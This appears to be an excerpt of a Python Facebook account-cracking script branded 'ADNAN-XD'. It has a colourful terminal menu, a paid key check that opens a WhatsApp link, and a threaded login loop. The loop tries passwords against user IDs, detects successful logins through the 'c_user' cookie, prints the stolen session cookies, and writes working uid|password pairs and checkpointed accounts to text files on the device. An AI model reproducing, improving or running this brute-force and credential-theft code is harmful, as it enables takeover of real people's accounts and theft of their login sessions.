...
def o():
    ...
    ADNAN = input('     \033[97;1m[\033[92;1m?\033[97;1m] \033[97;1mSelect menu \033[38;5;196m: ')
    if ADNAN == '1':
        i()
    if ADNAN == '2':
        os.system('xdg-open https://www.facebook.com/MR.ADNAN.KING.OF.FACEBOOK')
    if ADNAN == '3':
        os.system('xdg-open https://www.facebook.com/MR.ADNAN.KING.OF.FACEBOOK')
    if ADNAN == 'E':
        os.system('exit')
...
888b     d888 8888888b.             d8888 8888888b.  888b    888        d8888 888b    888 
8888b   d8888 888   Y88b           d88888 888  "Y88b 8888b   888       d88888 8888b   888 
88888b.d88888 888    888          d88P888 888    888 88888b  888      d88P888 88888b  888 
888Y88888P888 888   d88P         d88P 888 888    888 888Y88b 888     d88P 888 888Y88b 888 
888 Y888P 888 8888888P"         d88P  888 888    888 888 Y88b888    d88P  888 888 Y88b888 
888  Y8P  888 888 T88b  888888 d88P   888 888    888 888  Y88888   d88P   888 888  Y88888 
888   "   888 888  T88b       d8888888888 888  .d88P 888   Y8888  d8888888888 888   Y8888 
888       888 888   T88b     d88P     888 8888888P"  888    Y888 d88P     888 888    Y888 

     \033[1;32m[•]═════════════════════════════════[•]
        \033[1;97m[\033[1;92m❯\033[1;97m]ADMIN     \033[1;91m: \033[1;97mADNAN \033[1;92m            
        \033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;91m: \033[1;97mADNAN AHMED \033[1;92m      
        \033[1;97m[\033[1;92m❯\033[1;97m]FB GROUP  \033[1;91m: \033[1;97m[ERROR]\033[1;92m 
...
def i():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print('     \033[97;1m[\033[92;1m+\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;46mADNAN-XD-OK.txt')
        print('     \033[97;1m[\033[92;1m+\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;196mADNAN-XD-CP.txt')
        print("     \033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m-\033[1;32m-\033[1;33m-\033[38;5;196m-")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\033[38;5;46m[ADNAN-OK] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES : \033[38;5;46m'+coki+ ' ')                
                open('/sdcard/ADNAN-XD-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;46m[ADNAN-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/ADNAN-XD-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r    \33[1;93m[\033[1;95mADNAN\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def Subscraption():
	...
	if key1 in r1:
		...
		print("    \033[97;1m[\033[92;1m•\033[97;1m]\33[0;92mYour Key  :\033[1;94m "+ak+Adnan+key1)
		...
		os.system('am start https://wa.me/+880177504262?text=' + tks)
		Subscraption() 
#Subscraption()
o()
